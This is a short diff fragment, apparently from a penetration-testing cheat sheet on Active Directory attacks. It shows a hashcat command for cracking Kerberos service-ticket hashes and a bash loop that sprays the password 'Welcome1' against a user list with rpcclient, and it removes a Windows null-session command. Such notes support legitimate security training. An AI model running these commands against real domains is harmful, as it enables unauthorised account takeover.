@@ -42,18 +42,6 @@ hashcat -m 13100 -a 0 hashes.txt passwordlist.txt -O
 |rpcclient|135/TCP|
 |smbclient|445/TCP|
 
-##### Using Windows
-__NULL Session__
-```cmd
-net use \\DC01\ipc$ "" /u:""
-```
-
-__Credentialed__
-```cmd
-net accounts
-```
-
-#### Spray
 __rpcclient__
 ```bash
 for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" $IP | grep Authority; done
